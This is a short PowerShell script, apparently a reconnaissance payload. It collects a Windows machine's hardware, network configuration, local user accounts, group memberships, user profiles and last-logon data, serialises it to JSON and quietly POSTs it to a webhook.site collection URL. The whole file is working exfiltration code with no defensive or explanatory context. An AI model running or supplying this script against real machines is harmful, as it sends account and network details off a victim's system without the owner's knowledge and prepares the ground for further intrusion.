
# Replace the webhook url
$webhookUrl = 'https://webhook.site/7c90c9ef-a00f-4256-be00-51bf4287b84e'

# Collect system info into variables
$computerInfo = Get-ComputerInfo
$processorInfo = Get-WmiObject -Class Win32_Processor
$memoryInfo = Get-WmiObject -Class Win32_PhysicalMemory
$diskInfo = Get-WmiObject -Class Win32_DiskDrive
$networkInfo = Get-WmiObject -Class Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -eq $true }
$userAccounts = Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.LocalAccount -eq $true }
$currentUser = Get-WmiObject -Class Win32_ComputerSystem | Select-Object Username
$localUsers = Get-LocalUser
$userProfiles = Get-WmiObject -Class Win32_UserProfile
$groupMemberships = Get-LocalGroup | ForEach-Object { Get-LocalGroupMember -Group $_.Name }
$lastLogon = Get-WmiObject -Class Win32_NetworkLoginProfile | Select-Object Name, LastLogon

$dataObject = [PSCustomObject]@{
    ComputerInfo    = $computerInfo
    ProcessorInfo   = $processorInfo
    MemoryInfo      = $memoryInfo
    DiskInfo        = $diskInfo
    NetworkInfo     = $networkInfo
    UserAccounts    = $userAccounts
    CurrentUser     = $currentUser
    LocalUsers      = $localUsers
    UserProfiles    = $userProfiles
    GroupMemberships = $groupMemberships
    LastLogon       = $lastLogon
}

$jsonData = $dataObject | ConvertTo-Json -Depth 3

# Send it to webhook URL
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonData -ContentType 'application/json' | Out-Null